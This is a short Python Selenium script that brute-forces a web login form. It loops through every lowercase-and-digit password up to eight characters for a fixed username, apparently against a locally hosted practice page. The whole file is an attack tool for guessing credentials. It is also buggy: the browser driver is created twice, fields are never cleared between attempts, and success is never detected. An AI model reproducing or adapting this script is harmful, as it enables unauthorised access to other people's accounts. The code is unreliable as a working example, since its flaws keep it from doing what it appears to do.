import itertools
import string
from selenium import webdriver

username = "user"
chrome_path = r'/usr/local/bin/chromedriver'
driver = webdriver.Chrome(executable_path=chrome_path)

driver = webdriver.Chrome("chromedriver")
driver.get("http://127.0.0.1:5500/main.html")
chars = string.ascii_lowercase + string.digits
attempts = 0
for password_length in range(1, 9):
    for guess in itertools.product(chars, repeat=password_length):
        attempts += 1
        guess = ''.join(guess)
        
        driver.find_element_by_xpath('//*[@id="username-field"]').send_keys(username)
        driver.find_element_by_xpath('//*[@id="password-field"]').send_keys(guess)
        driver.find_elements_by_xpath('//*[@id="login-form-submit"]')[0].click()
        print(guess, attempts)

